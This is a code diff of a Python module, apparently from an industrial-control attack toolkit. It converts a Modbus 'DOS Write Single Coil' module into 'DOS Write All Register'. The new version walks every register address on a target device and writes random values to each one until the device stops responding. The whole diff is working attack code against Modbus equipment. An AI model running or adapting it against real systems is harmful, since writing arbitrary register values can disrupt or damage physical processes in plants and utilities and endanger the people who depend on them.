@@ -12,16 +12,16 @@ class Module:
 
 
 	info = {
-		'Name': 'DOS Write Single Coil',
+		'Name': 'DOS Write All Register',
 		'Author': ['@enddo'],
-		'Description': ("DOS With Write Single Coil Function"),
+		'Description': ("DOS With Write All Register Function"),
 
         }
 	options = {
 		'RHOST'		:[''		,True	,'The target IP address'],
 		'RPORT'		:[502		,False	,'The port number for modbus protocol'],
 		'UID'		:[''		,True	,'Modbus Slave UID.'],
-		'Threads'	:[24		,False	,'The number of concurrent threads'],
+		'Threads'	:[1		,False	,'The number of concurrent threads'],
 		'Output'	:[False		,False	,'The stdout save in output directory']
 	}	
 	output = ''
@@ -37,13 +37,11 @@ class Module:
 				THREADS.append(thread)
 			else:
 				break
+			for thread in THREADS:
+				thread.join()
 			if(down):
+				self.printLine('[-] Modbus is not running on : ' + self.options['RHOST'][0],bcolors.WARNING)
 				break
-
-		for thread in THREADS:
-			thread.join()
-		if(down):
-			self.printLine('[-] Modbus is not running on : ' + self.options['RHOST'][0],bcolors.WARNING)
 		if(self.options['Output'][0]):
 			open(mainPath + '/Output/' + moduleName + '_' + self.options['RHOST'][0].replace('/','_') + '.txt','a').write('='*30 + '\n' + self.output + '\n\n')
 		self.output 	= ''
@@ -59,15 +57,19 @@ class Module:
 
 	def do(self,ip):
 		global down
-		if(down == True):
-			return None
-		while True:
+		for i in range(0xffff):
+			if(down):
+				break
 			c = connectToTarget(ip,self.options['RPORT'][0])
 			if(c == None):
 				down = True
 				return None
 			try:
-				ans = c.sr1(ModbusADU(transId=getTransId(),unitId=int(self.options['UID'][0]))/ModbusPDU05_Write_Single_Coil(outputAddr=int(hex(random.randint(0,16**4-1)|0x1111),16),outputValue=int('0x0000',16)),timeout=timeout, verbose=0)
+				self.printLine('[+] Write on Register Address ' + str(int(hex(i|0x1111),16)),bcolors.OKGREEN)
+				ans = c.sr1(ModbusADU(transId=getTransId(),unitId=int(self.options['UID'][0]))/ModbusPDU06_Write_Single_Register(registerAddr=int(hex(i|0x1111),16),registerValue=int(hex(random.randint(0,16**4-1)|0x1111),16)),timeout=timeout, verbose=0)
+				ans = ModbusADU_Answer(str(ans))
+				self.printLine('[+] Response is :',bcolors.OKGREEN)
+				ans.show()
 			except:
 				pass
 			
